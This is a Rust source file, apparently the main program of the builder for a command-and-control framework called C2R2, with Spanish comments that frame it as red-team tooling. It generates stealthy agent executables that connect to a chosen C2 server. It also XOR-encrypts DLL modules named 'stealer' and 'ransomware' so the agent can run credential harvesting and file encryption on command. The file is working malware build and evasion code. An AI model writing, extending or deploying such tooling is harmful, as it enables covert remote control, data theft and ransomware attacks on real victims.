//! R2C2 es un proyecto de Command & Control para red team engagements en Linux y Windows.

mod encrypt;
mod dll_encrypt;

use clap::{Parser, Subcommand};
use encrypt::generate_agent;
use dll_encrypt::{encrypt_dll, generate_random_key};
use std::path::PathBuf;
use std::env;

#[derive(Parser)]
#[command(name = "c2r2-builder")]
#[command(about = "C2R2 Agent Builder - Genera agentes y módulos", long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Genera un agente para el C2
    BuildAgent {
        /// Nombre del agente generado (sin extensión .exe)
        #[arg(short, long)]
        name: String,

        /// Servidor C2 (IP:Puerto)
        #[arg(short, long, default_value = "127.0.0.1:4444")]
        server: String,

        /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
        #[arg(short, long)]
        production: bool,
    },

    /// Encripta un módulo DLL para ser usado por el agente
    EncryptModule {
        /// Módulo a encriptar (stealer o ransomware)
        #[arg(long, default_value = "stealer")]
        module: String,
    },
}

fn main() {
    let args = Args::parse();

    match args.command {
        Commands::BuildAgent { name, server, production } => {
            println!(" C2R2 Agent Builder v2.0");
            println!("  Agente: {}", name);
            println!(" Servidor C2: {}", server);
            println!(" Modo: {}", if production { "PRODUCCIÓN (stealthy)" } else { "DESARROLLO (debug)" });
            println!("{}", "-".repeat(50));

            match generate_agent(&name, &server, production) {
                Ok(_) => {
                    println!(" Agente generado exitosamente: {}.exe", name);
                }
                Err(e) => {
                    eprintln!(" Error: {}", e);
                    std::process::exit(1);
                }
            }
        }

        Commands::EncryptModule { module } => {
            println!(" C2R2 Module Encryptor v2.0");
            println!(" Módulo: {}", module);
            println!("{}", "-".repeat(50));

            // Validar módulo
            if module != "stealer" && module != "ransomware" {
                eprintln!(" Error: Módulo desconocido '{}'", module);
                eprintln!("   Módulos disponibles: stealer, ransomware");
                std::process::exit(1);
            }

            // Obtener el directorio raíz del workspace (desde CARGO_MANIFEST_DIR o current_dir)
            let workspace_root = if let Ok(manifest_dir) = env::var("CARGO_MANIFEST_DIR") {
                // Ejecutado con cargo run, manifest_dir apunta a builder/
                PathBuf::from(manifest_dir).parent().unwrap().to_path_buf()
            } else {
                // Ejecutado como binario, usar current_dir y buscar Cargo.toml
                let mut current = env::current_dir().expect("No se pudo obtener current_dir");
                loop {
                    if current.join("Cargo.toml").exists() {
                        let content = std::fs::read_to_string(current.join("Cargo.toml"))
                            .unwrap_or_default();
                        if content.contains("[workspace]") {
                            break;
                        }
                    }
                    if !current.pop() {
                        eprintln!(" Error: No se encontró el directorio raíz del workspace");
                        std::process::exit(1);
                    }
                }
                current
            };

            // Buscar DLL en target de Windows (cross-compilation desde Linux)
            let dll_path_win = workspace_root.join(format!("target/x86_64-pc-windows-gnu/release/{}.dll", module));
            let dll_path_native = workspace_root.join(format!("target/release/{}.dll", module));

            let dll_path = if dll_path_win.exists() {
                dll_path_win
            } else if dll_path_native.exists() {
                dll_path_native
            } else {
                eprintln!(" Error: No se encontró {}.dll", module);
                eprintln!("   Ejecuta primero:");
                eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package {}-dll", module);
                eprintln!();
                eprintln!("   Rutas buscadas:");
                eprintln!("   - {}", dll_path_win.display());
                eprintln!("   - {}", dll_path_native.display());
                std::process::exit(1);
            };

            println!(" DLL encontrada: {}", dll_path.display());

            let output_enc = workspace_root.join(format!("c2r2-server/modules/{}.enc", module));
            let output_key = workspace_root.join(format!("c2r2-server/modules/{}.key", module));

            // Crear directorio modules si no existe
            if let Some(parent) = output_enc.parent() {
                if !parent.exists() {
                    if let Err(e) = std::fs::create_dir_all(parent) {
                        eprintln!(" Error creando directorio modules/: {}", e);
                        std::process::exit(1);
                    }
                }
            }

            // Generar clave XOR aleatoria de 32 bytes
            let xor_key = generate_random_key(32);

            println!("\n Encriptando {}.dll...", module);
            match encrypt_dll(&dll_path, &output_enc, &xor_key) {
                Ok(_) => println!(" DLL encriptada: {}", output_enc.display()),
                Err(e) => {
                    eprintln!(" Error encriptando DLL: {}", e);
                    std::process::exit(1);
                }
            }

            // Guardar clave
            if let Err(e) = std::fs::write(&output_key, &xor_key) {
                eprintln!(" Error guardando clave: {}", e);
                std::process::exit(1);
            }
            println!(" Clave guardada: {} ({} bytes)", output_key.display(), xor_key.len());

            println!("\n Archivos generados:");
            println!("   - {}", output_enc.display());
            println!("   - {}", output_key.display());

            if module == "stealer" {
                println!("\nℹ  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
            } else if module == "ransomware" {
                println!("\nℹ  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware");
            }
        }
    }
}
